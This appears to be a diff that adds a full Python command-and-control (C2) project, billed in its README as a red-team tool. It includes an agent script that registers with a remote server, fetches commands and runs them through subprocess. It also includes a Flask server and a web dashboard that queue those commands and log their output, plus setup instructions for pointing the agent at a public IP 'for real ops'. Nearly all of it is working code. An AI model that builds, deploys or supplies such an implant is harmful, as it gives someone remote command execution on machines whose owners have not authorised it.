@@ -1,0 +1,201 @@
+### Folder Structure
+
+```
+custom-c2/
+├── agent/
+│   └── agent.py
+├── server/
+│   ├── app.py
+│   ├── handlers.py  # (optional for future enhancements)
+│   ├── database.py  # (optional for future use)
+│   └── templates/
+│       └── dashboard.html
+├── logs/            # Stores output logs from agents
+├── README.md
+├── .gitignore
+└── requirements.txt
+```
+
+---
+
+### custom-c2/agent/agent.py
+
+import requests
+import socket
+import platform
+import time
+import subprocess
+import uuid
+
+server_url = "http://127.0.0.1:5000"  # Change to public IP for real ops
+agent_id = str(uuid.uuid4())[:8]
+
+hostname = socket.gethostname()
+os_name = platform.system()
+
+while True:
+    try:
+        requests.post(f"{server_url}/register", json={
+            'id': agent_id,
+            'hostname': hostname,
+            'os': os_name
+        })
+
+        cmd_resp = requests.get(f"{server_url}/get_command/{agent_id}").json()
+        cmd = cmd_resp.get('cmd')
+
+        if cmd:
+            result = subprocess.getoutput(cmd)
+            requests.post(f"{server_url}/send_output/{agent_id}", json={'output': result})
+
+        time.sleep(5)
+    except Exception as e:
+        time.sleep(10)
+        continue
+
+---
+
+### custom-c2/server/app.py
+
+from flask import Flask, request, render_template, jsonify
+from datetime import datetime
+import base64
+import os
+import json
+
+app = Flask(__name__)
+
+agents = {}
+commands = {}
+
+@app.route('/')
+def index():
+    return render_template('dashboard.html', agents=agents)
+
+@app.route('/register', methods=['POST'])
+def register():
+    data = request.get_json()
+    agent_id = data['id']
+    agents[agent_id] = {
+        'ip': request.remote_addr,
+        'os': data['os'],
+        'hostname': data['hostname'],
+        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    }
+    return {'status': 'registered'}
+
+@app.route('/get_command/<agent_id>', methods=['GET'])
+def get_command(agent_id):
+    agents[agent_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    return {'cmd': commands.get(agent_id, '')}
+
+@app.route('/send_output/<agent_id>', methods=['POST'])
+def receive_output(agent_id):
+    output = request.get_json()['output']
+    with open(f'logs/{agent_id}.log', 'a') as f:
+        f.write(f"[{datetime.now()}] {output}\n")
+    commands[agent_id] = ''
+    return {'status': 'received'}
+
+@app.route('/command', methods=['POST'])
+def send_command():
+    data = request.form
+    agent_id = data['agent']
+    cmd = data['command']
+    commands[agent_id] = cmd
+    return index()
+
+if __name__ == '__main__':
+    os.makedirs('logs', exist_ok=True)
+    app.run(debug=True, host='0.0.0.0', port=5000)
+
+---
+
+### custom-c2/server/templates/dashboard.html
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Custom C2 Dashboard</title>
+    <style>
+        body { background-color: #121212; color: #eee; font-family: monospace; }
+        .agent { border: 1px solid #444; padding: 10px; margin: 10px; background: #1e1e1e; }
+        input, button { padding: 5px; margin: 5px; background: #222; color: #eee; border: 1px solid #555; }
+    </style>
+</head>
+<body>
+    <h1>Connected Agents</h1>
+    {% for agent, info in agents.items() %}
+    <div class="agent">
+        <strong>ID:</strong> {{ agent }}<br>
+        <strong>IP:</strong> {{ info.ip }}<br>
+        <strong>OS:</strong> {{ info.os }}<br>
+        <strong>Hostname:</strong> {{ info.hostname }}<br>
+        <strong>Last Seen:</strong> {{ info.last_seen }}<br>
+        <form method="post" action="/command">
+            <input type="hidden" name="agent" value="{{ agent }}">
+            <input type="text" name="command" placeholder="Enter command">
+            <button type="submit">Send</button>
+        </form>
+    </div>
+    {% endfor %}
+</body>
+</html>
+
+---
+
+### .gitignore
+
+__pycache__/
+*.pyc
+logs/
+.env
+
+---
+
+### requirements.txt
+
+Flask==2.3.2
+requests==2.31.0
+
+---
+
+### README.md
+
+# Custom C2 Server
+
+A lightweight, Python-based Command & Control (C2) server for red team operations.
+
+## Features
+- Flask web server with dark-themed dashboard
+- Agent registration and command execution
+- Encrypted communication placeholder (future)
+- Logs per agent stored in `logs/`
+
+## Usage
+
+### Setup
+```bash
+git clone https://github.com/yourusername/custom-c2.git
+cd custom-c2
+pip install -r requirements.txt
+```
+
+### Run Server
+```bash
+cd server
+python app.py
+```
+
+### Run Agent
+```bash
+cd agent
+python agent.py
+```
+
+> Replace `server_url` with your public IP for remote ops.
+
+---
+
+Ready for GitHub!
